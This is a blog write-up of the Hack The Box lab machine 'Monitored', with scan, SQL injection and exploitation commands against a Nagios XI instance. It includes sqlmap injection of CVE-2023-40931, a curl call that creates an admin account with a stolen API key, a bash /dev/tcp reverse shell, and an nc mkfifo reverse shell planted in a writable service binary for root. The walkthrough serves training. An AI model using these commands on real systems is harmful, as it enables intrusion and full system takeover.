<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Monitored</title>
<meta name=description content="Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-monitored/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Monitored"><meta property="og:description" content="Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Monitored"><meta name=twitter:description content="Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-monitored/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-monitored/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-monitored/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-monitored/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Monitored</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>May 9, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Monitored>Monitored</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p>Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage <code>CVE-2023-40931</code> to add a new admin account to the Nagios XI instance to grant us access. By executing a command in Nagios XI we gain our initial foothold to recover the user flag, and by manipulating some services we escalate our privileges to find the root flag.</p><p>Target IP - <code>10.10.11.248</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Monitored 10.10.11.248
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-17 11:55 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.248
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.051s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>996</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE  VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp  open  http     Apache httpd 2.4.56
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Debian<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to https://nagios.monitored.htb/
</span></span><span style=display:flex><span>389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
</span></span><span style=display:flex><span>443/tcp open  ssl/http Apache httpd 2.4.56 <span style=color:#56b6c2>((</span>Debian<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Debian<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| tls-alpn: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>|_http-title: Nagios XI
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>nagios.monitored.htb/organizationName<span style=color:#56b6c2>=</span>Monitored/stateOrProvinceName<span style=color:#56b6c2>=</span>Dorset/countryName<span style=color:#56b6c2>=</span>UK
</span></span><span style=display:flex><span>| Not valid before: 2023-11-11T21:46:55
</span></span><span style=display:flex><span>|_Not valid after:  2297-08-25T21:46:55
</span></span><span style=display:flex><span>Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 19.69 seconds
</span></span></code></pre></div><p>Four open ports are found, 22 (SSH), 80 (HTTP with Apache), 389 (LDAP), 443 (HTTPS). We also get redirected to <code>nagios.monitored.htb/</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.248 monitored.htb nagios.monitored.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>Navigating to <code>https://nagios.monitored.htb/</code> we find a page leading us to a Nagios XI login page after we click on <code>Access Nagios XI</code>.</p><p><img src=/images/HTB-Monitored/Nagios-XI.png alt="Nagios XI"></p><p>The url is <code>https://nagios.monitored.htb/nagiosxi/login.php</code>. We lack the credentials to login at this moment.</p><p><img src=/images/HTB-Monitored/Nagios-XI-login.png alt=Nagios-login-XI></p><blockquote><p>Nagios is an <strong>Open Source IT system monitoring tool</strong>. It was designed to run on the Linux operating system and can monitor devices running Linux, Windows and Unix OSes.</p></blockquote><p>We can do some directory enumeration with ffuf. Let&rsquo;s start with <code>https://nagios.monitored.htb/</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ -ic
</code></pre><p><img src=/images/HTB-Monitored/fuzz.png alt="Subdomain fuzzing"></p><p>Visiting <code>https://nagios.monitored.htb/nagios</code> prompt us to log in but we don&rsquo;t have any credentials at this point.</p><p><img src=/images/HTB-Monitored/nagios-login.png alt="Second Nagios Login form"></p><p>Next we fuzz <code>https://nagios.monitored.htb/nagiosxi/</code> and multiple results are found.</p><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/FUZZ&#39; -e .php,.html,.txt -ic -fc 404 -c
</code></pre><p><img src=/images/HTB-Monitored/ffuf.png alt="Ffuf directory enumeration"></p><ul><li><p>Most of these endpoints redirect to the login page probably because we need to be authenticated in order to access them.</p></li><li><p><code>/images</code> and <code>/api</code> return <code>Forbidden</code>.</p></li></ul><p><img src=/images/HTB-Monitored/forbidden.png alt="Forbidden page"></p><ul><li><code>/terminal</code> brings up a page titled <code>Shell In A Box</code> where we have access to a terminal in the browser to login into something.</li></ul><p><img src=/images/HTB-Monitored/terminal.png alt="Nagios XI terminal endpoint"></p><p>Going deeper, <code>/images</code> reveals more results but we don&rsquo;t have the permissions to access them.</p><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/images/FUZZ&#39; -ic -c
</code></pre><p><img src=/images/HTB-Monitored/images-fuzz.png alt="Images endpoint enumeration"></p><p><img src=/images/HTB-Monitored/renewals.png alt="Images endpoint enumeration - Renewal"></p><p>Doing the same thing for <code>/api</code> we find <code>/includes</code> and <code>/v1</code>.</p><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u &#39;https://nagios.monitored.htb/nagiosxi/api/FUZZ&#39; -ic -c
</code></pre><p><img src=/images/HTB-Monitored/api.png alt="api endpoint enumeration"></p><p><code>includes</code> doesn&rsquo;t give anything useful but <code>v1</code> does returns a few interesting results.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fc 404 -u &#39;https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ&#39; -ic -fs 32 -fc 403
</code></pre><p><img src=/images/HTB-Monitored/v1-fuzz.png alt="api endpoint enumeration - v1"></p><p>Both <code>license</code> and <code>autheticate</code> return errors.</p><p><img src=/images/HTB-Monitored/license.png alt="api endpoint enumeration - v1 - license"></p><p><img src=/images/HTB-Monitored/authenticate.png alt="api endpoint enumeration - v1 - authenticate"></p><p>At this point we have enumerated everything we discovered. So far we have found:</p><ul><li><p>Three login pages:</p><ul><li><a href=https://nagios.monitored.htb/nagiosxi/>https://nagios.monitored.htb/nagiosxi/</a></li><li><a href=https://nagios.monitored.htb/nagiosxi/terminal>https://nagios.monitored.htb/nagiosxi/terminal</a></li><li><a href=https://nagios.monitored.htb/nagios>https://nagios.monitored.htb/nagios</a></li></ul></li><li><p>An authentication endpoint at <a href=https://nagios.monitored.htb/nagiosxi/api/v1/authenticate>https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</a></p></li></ul><p>It is clear that we need some credentials to access the target system.</p><blockquote><p>Although UDP scans are rarely needed in CTFs, we should be as thorough as possible with our scanning. I scratched my head for a long time because I forgot about UDP scans.</p></blockquote><p>Let&rsquo;s try a UDP scan.</p><pre tabindex=0><code>sudo nmap -sU -sC -sV -vv 10.10.11.248
</code></pre><blockquote><p>This command will produce a lot of output and keep in mind that UDP scan are usually slower.</p></blockquote><p><img src=/images/HTB-Monitored/udp-scan.png alt="nmap UDP scan"></p><p>Four ports will be discovered:</p><ul><li>68 - DHCP</li><li>123 - NTP</li><li>161 - SNMPv1</li><li>162 - SNMPv3</li></ul><p>The most likely way to exploitation is SNMP. We can use <code>snmpwalk</code> to enumerate the service. We note that two versions of SNMP are used here, we will specify <code>SNMP V1</code> since it&rsquo;s less secure.</p><blockquote><p>The command below creates a lot of output on the terminal so I sent it to a file.</p></blockquote><pre tabindex=0><code>snmpwalk -c public -v1 -t 10 10.10.11.248 &gt; snmp.txt
</code></pre><p>Going over the output we find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p><p><img src=/images/HTB-Monitored/creds-snmp.png alt="SNMP potential credentials"></p><p>The credentials did not work on <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> and we get the message that this user account is either disabled or non-existent at <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p><p><img src=/images/HTB-Monitored/nagiosxi-login-attempt.png alt="NagiosXI login attempt failed"></p><h2 id=initial-foothold>Initial Foothold</h2><p>At <code>https://nagios.monitored.htb/nagios</code> we are able to login. On that page we see a PID and the software version. Trying to reuse the cookie value from this page on <code>/nagiosxi</code> also fails.</p><p><img src=/images/HTB-Monitored/nagios-core.png alt="NagiosXI login attempt successful"></p><p>Searching for vulnerabilities for that specific software version we end finding <a href=https://outpost24.com/blog/nagios-xi-vulnerabilities/>three CVEs</a>. They all allow users, with various levels of privileges, to access database fields via SQL injections.</p><p><img src=/images/HTB-Monitored/nagios-vulns.png alt="NagiosXI vulnerabilities"></p><p>We find a good explanation for the vulnerability in the post.</p><p><img src=/images/HTB-Monitored/CVE-2023-40931-EXPLAINED.png alt=CVE-2023-40931-EXPLAINED></p><p>We recall that back on the <code>/api/v1/authenticate</code> we saw the message <code>You can only use POST with authenticate.</code></p><ol><li>We send a POST request to that endpoint with the credentials of the user and receive a token</li></ol><pre tabindex=0><code>curl -k -L -X POST &#34;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#34; -d &#34;username=svc&amp;password=XjH7VCehowpR1xZB&#34;
</code></pre><p><img src=/images/HTB-Monitored/token-retrieval.png alt="Token retrieval"></p><ol start=2><li>We use this token to launch an SQL injection</li></ol><pre tabindex=0><code>sqlmap -u &#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=895ab920b8c2b4196e16ee5c4f6c4470fbd77bae&#34; -p id --level 5 --risk 3 --dump 
</code></pre><p>Once you see <code>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</code> enter <code>N</code>.</p><p><img src=/images/HTB-Monitored/sqlmap.png alt="SQLmap command"></p><p>SQLmap will start dumping all the tables of the database on the terminal but we can inspect the tables we are interested in by going to <code>/home/&lt;YOUR_USERNAME>/.local/share/sqlmap/output/nagios.monitored.htb/dump/</code>. We know that the exploit is related to the tables <code>xi_session</code> and <code>xi_users</code>.</p><p><img src=/images/HTB-Monitored/tables-dumped.png alt="SQLmap tables dump"></p><p>You can also scroll through the output on the terminal and find the <code>xi_users</code> table dump. We find the API key for the <code>Nagios Administrator</code> user <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code>.</p><p><img src=/images/HTB-Monitored/API-key.png alt="API key found"></p><blockquote><p>Passwords hashes are also present in the dump but we are unable to crack them.</p></blockquote><p>Still we don&rsquo;t have any valid credentials to login into Nagios XI and there is no way to sign up. Our only option is to find how to add a new account.</p><p>After some research we find how to add new users via the API <a href="https://support.nagios.com/forum/viewtopic.php?t=42923">here</a> and on <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502">this</a> page we also find that we can add an admin account by using the <code>auth_level</code> parameter.</p><p><img src=/images/HTB-Monitored/nagiosxi-api.png alt="NagiosXI add users via API"></p><p>The command below is used to create a new admin user. The <code>username</code>, <code>email</code>, <code>name</code>, and <code>password</code> fields are required.</p><pre tabindex=0><code>curl -k &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&#34; -d &#34;username=adminsec&amp;password=password123&amp;name=kscorpio&amp;email=kscorpio@monitored.htb&amp;auth_level=admin&#34;
</code></pre><p><img src=/images/HTB-Monitored/user-created.png alt="User added via API successfully"></p><p>With the account newly created we are able to log into Nagios XI at <code>https://nagios.monitored.htb/nagiosxi/</code></p><blockquote><p>You will be asked to change the password once you login.</p></blockquote><p><img src=/images/HTB-Monitored/nagiosxi-login.png alt="NagiosXI login success"></p><p>On the Dashboard, hover on the <code>Configure</code> menu and select <code>Core Config Manager</code>.</p><p><img src=/images/HTB-Monitored/nagiosxi-config.png alt="NagiosXI config"></p><p>Select <code>Commands</code> and then <code>Add New</code>.</p><p><img src=/images/HTB-Monitored/config-cmd.png alt="Core Config Manager"></p><p><img src=/images/HTB-Monitored/new-cmd.png alt="Add new command"></p><p>Add a reverse shell command and save it. For example: <code>bash -c 'bash -i >& /dev/tcp/&lt;IP_Address>/&lt;Port> 0>&amp;1'</code></p><p><img src=/images/HTB-Monitored/rev-shell-cmd.png alt="Reverse shell command"></p><p>You also have to click <code>Apply Configuration</code> for the new command to be listed. Now you should see <code>149 Commands</code>.</p><p><img src=/images/HTB-Monitored/apply-config.png alt="Apply configuration"></p><p>Let&rsquo;s start a listener on the port specified in our command.</p><p>To run the command go to <code>Monitoring</code> > <code>Hosts</code> > click on <code>localhost</code>.</p><p><img src=/images/HTB-Monitored/localhost.png alt="Configuration - localhost"></p><p>Under <code>Check command</code>, select your command and click <code>Run Check Command</code> and you will get a connection on your listener.</p><p><img src=/images/HTB-Monitored/nagios-shell.png alt="Initial Foothold"></p><p>You can get the user flag at <code>/home/nagios/user.txt</code>.</p><p><img src=/images/HTB-Monitored/user-flag.png alt="User flag"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>Running <code>sudo -l</code> we discover that the user can manipulate two services <code>nagios</code> and <code>npcd</code> in addition to running various scripts.</p><p><img src=/images/HTB-Monitored/sudo-l.png alt="sudo -l command"></p><blockquote><p>The npcd service in Nagios is a <strong>daemon</strong> responsible for processing <strong>performance data</strong> received from Nagios checks.</p></blockquote><p>Using the <code>find</code> command we get the exact locations of <code>nagios</code> and <code>npcd</code>.</p><pre tabindex=0><code>find / -name nagios 2&gt; /dev/null

find / -name npcd 2&gt; /dev/null
</code></pre><p><img src=/images/HTB-Monitored/services-location.png alt="services locations"></p><p>We also check the permissions of the binaries and we notice that we have write permission for <code>npcd</code>. We can edit the file content and replace it with a malicious command to get a shell.</p><p><img src=/images/HTB-Monitored/binaries-perms.png alt="Binaries permissions"></p><ol><li>Stop the service</li></ol><pre tabindex=0><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
</code></pre><ol start=2><li>Edit <code>npcd</code></li></ol><pre tabindex=0><code>echo &#39;#!/bin/bash&#39; &gt; /usr/local/nagios/bin/npcd

echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 5555 &gt;/tmp/f&#39; &gt;&gt; /usr/local/nagios/bin/npcd
</code></pre><ol start=3><li>Start a listener and start the <code>npcd</code> service using the script.</li></ol><pre tabindex=0><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
</code></pre><p>We get a root shell on our listener and we can read the root flag at <code>/root/root.txt</code>.</p><p><img src=/images/HTB-Monitored/root-flag.png alt="Root flag"></p><p>Monitored was a fun challenge forcing me to up my scanning and enumeration game, this was the first time I had to use a UDP scan for a CTF. I hope this write up was helpful! If you have any questions you can reach out on Twitter at <a href=https://twitter.com/_KScorpio>_KScorpio</a>.</p></div><div class=prev-next><div class=next-post><p><a href=/posts/htb-bizness/>Next:
HTB: Bizness
&#8594;</a></p><p class=next-post-date>May 22, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>